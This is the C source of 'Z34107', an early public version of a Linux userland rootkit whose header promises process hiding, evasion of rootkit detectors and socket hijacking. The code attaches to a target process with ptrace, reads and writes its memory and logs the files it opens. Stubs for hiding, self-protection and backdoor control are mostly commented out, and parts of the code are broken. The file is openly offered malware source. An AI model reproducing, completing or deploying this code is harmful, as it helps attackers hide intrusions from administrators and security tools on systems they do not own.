/**************************************************************
 *                    Z34107 v0.01 (Public Version)           *
 *           ~=The userland rootkit from hell=~               *
 *    Author: pasv (pasvninja@gmail.com)                      *
 *    Greetz:                  *
 **************************************************************
 * Description:                                               *
 * Just when you thought patching your kernel with the latest *
 * and greatest security enhancements, installing the best    *
 * host based intrusion detection systems money can buy was   *
 * going to tell you if I got into your systems... Here it is *
 * the Zealot of all rootkits.                                *
 **************************************************************
 * Features (public version):
 * Universal process infection
 * Anti-Anti-rootkit technologies (not a typo ;)
 * process hiding/user hiding
 * ioctl interface runtime process controller
 * module-monitoring 
 * on-the-fly process hiding via wrapper program
 * signature based blacklisting of detection tools
 * socket hijacking based on magic strings
 * 
 *************/
#define PROG "Z34107"
#define VERSION "v0.01"
#define AUTHOR "pasv (pasvninja@gmail.com)"

#include <linux/user.h>
//#include <linux/dirent.h> //also evil
#include <linux/types.h>
#include <sys/reg.h> //i hate this file
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <linux/user.h>
//#include <sys/types.h>
#include <sys/wait.h>
#include <asm/unistd.h>
//#include <dirent.h>
#include <strings.h>


struct linux_dirent64 {
	__u64 d_ino;
	__s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[0];
};

void getdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, sizeof(long));
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        data.val = ptrace(PTRACE_PEEKDATA,
                          child, addr + i * 4,
                          NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len) {
    char *laddr;
    int i, j;
    union u {
            long val;
            char chars[sizeof(long)];
    }data;
    i = 0;
    j = len / sizeof(long);
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, sizeof(long));
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
        ++i;
        laddr += sizeof(long);
    }
    j = len % sizeof(long);
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
               addr + i * 4, data.val);
    }
}

void p_getstr(int pid, char *str, long addr) {
	int i=0,j=0;
	long temp;
	while(1) {
		temp=ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0);
		memcpy(str+(4*i), &temp, 4);
		for(j=0;j<4;j++) {
			if(str[(4*i)+j] == '\0') return;
		}
		i++;
	}
}

struct linux_dirent64 *get_dirent (int pid, long addr) {
	int i=0;
	int len=sizeof(struct linux_dirent64);
	struct linux_dirent64 *tmp;
	char *rcv;
	tmp=(struct linux_dirent64 *)rcv;
	while(len >= 0) {
		len-=4;
		//(rcv+(4*i)) = (char) ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0);
		strcat(rcv, (char *) ptrace(PTRACE_PEEKDATA, pid, addr+(4*i), 0));
		i++;
	}
	return tmp;
}

/***************************************************************************
 *               THE SYSCALL HANDLERS                                      *
 ***************************************************************************/

/*
int syscall_getdents64(int pid, struct user_regs_struct regz) {
	int in, res, j;
	struct linux_dirent64 dirp;
	
	if(in==0) {
		printf("inside syscall\n");
		in=1;
		p[0]=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
		p[1]=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
		count=p[2]=ptrace(PTRACE_PEEKUSER, pid, EDX*4, 0);
	}
	else { // out of the syscall
		in=0;
		printf("outside syscall\n");
   		//dirent=get_dirent(pid, p[1]);
		res=(long) ptrace(PTRACE_PEEKUSER, pid, EAX*4, NULL);
		j=0;
		while(j<res) {
			getdata(pid,(p[1]+j),dirp,sizeof(struct linux_dirent64));
			getdata(pid,p[1]+j+sizeof(struct linux_dirent64),dirp, (sizeof(struct linux_dirent64)-dirp_d_reclen)(;
			if(!strcmp(dirp->d_name,TARGET)) printf ("WE FOUND IT\n");
			j+= dirp->d_reclen;
		}
	}
}
*/

int syscall_open(int pid, struct user_regs_struct regs) {
	long path_addr;
	char *path= (char *)malloc(1000);
	int flags;
	static int in_syscall;
	if(in_syscall == 0) {
		in_syscall=1;
		path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
		flags=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
		p_getstr(pid, path, path_addr);
		printf("open(%s,%x)!\n", path, flags);
	}
	else {
		in_syscall=0;
	}
}

int syscall_fork(int pid, struct user_regs_struct regs) {

}
/**************************End of syscall handlers*********************/

int hookem(int pid) {
	int w;
	struct user_regs_struct regz;
/*	long arg;
	int procfd;
	char procpath[MAXPATHLEN];

	sprintfs(procpath, "/proc/%d", pid);
	procfd=open(procpath, O_RDWR|O_EXCL);
	arg=PR_RLC;
	ioctl(procfd, PIOCSET, &arg);
	arg=PR_FORK;
	ioctl(procfd, PIOCSET, &arg); // thank you strace
*/	
	if(ptrace(PTRACE_ATTACH, pid, (char *) 1, NULL) != 0) { printf ("ptrace() phailed and so did you\n"); exit(-1); }
	
	/* the syscall taker loop */
	while(1) {
		wait(&w);
		if(WIFEXITED(w)) break;
		ptrace(PTRACE_GETREGS, pid, 0, &regz);
		switch (regz.orig_eax) {
//			case __NR_stat64: syscall_stat64(pid,regz); break; // various
			case __NR_open: syscall_open(pid,regz); break; // various
//			case __NR_getdents64: syscall_getdents64(pid,regz); break; // HIDE :D
			case __NR_fork: syscall_fork(pid,regz); break; // to follow procs
//			case __NR_unlink: syscall_unlink(pid,regz); break; // protection
//			case __NR_kill: syscall_kill(pid,regz); break; // protection
//			case __NR_read: syscall_read(pid,regz); break; // various
//			case __NR_write: syscall_write(pid,regz); break; // various
//			case __NR_init_module: syscall_init_module(pid,regz); break; // to hijack/evasion
//			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
//			case __NR_bind: syscall_bind(pid,regz); break; // to hijack connections/monitor
//			case __NR_accept: syscall_accept(pid,regz); break; // to hijack connections
//			case __NR_ioctl: syscall_ioctl(pid,regz); break; // to control backdoor
//			case __NR_ptrace: syscall_ptrace(pid,regz); break; // careful-- evasion
//			case __NR_delete_module: syscall_delete_module(pid,regz); break; // -- because we're such dicks
		}
		ptrace(PTRACE_SYSCALL, pid, 0, 0);
	}
}

int main (int argc, char **argv) {
	int pid;
	int target_list[1000];
	nice(-19);
	// get_procs(target_list);
	pid=atoi(argv[1]); // Just test it on one pid for now
	hookem(pid);
}
